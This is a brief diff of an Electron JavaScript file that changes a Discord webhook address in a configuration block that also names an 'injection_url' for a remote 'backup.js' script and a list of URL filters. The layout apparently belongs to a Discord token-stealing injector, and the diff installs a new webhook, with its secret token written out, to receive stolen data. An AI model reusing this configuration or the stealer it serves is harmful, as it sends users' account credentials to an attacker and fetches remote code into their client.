@@ -11,7 +11,7 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "https://discord.com/api/webhooks/1434301585525178378/yIhRjo_knXG6Wh1rE0QnCkwlAvMtCHW7gSaewspnbfg2LwsfVbn1Qo-xeb0VX_wEgTN8",
+    webhook: "https://discord.com/api/webhooks/1435663242101002391/BreNASgjP-4kx1WG7YUi7sJeosmny6GNewjcrz9_yJ5fagNw-i5rZ-gh-WhOKuEVO2IN",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/backup.js",
     filters: {
         urls: [
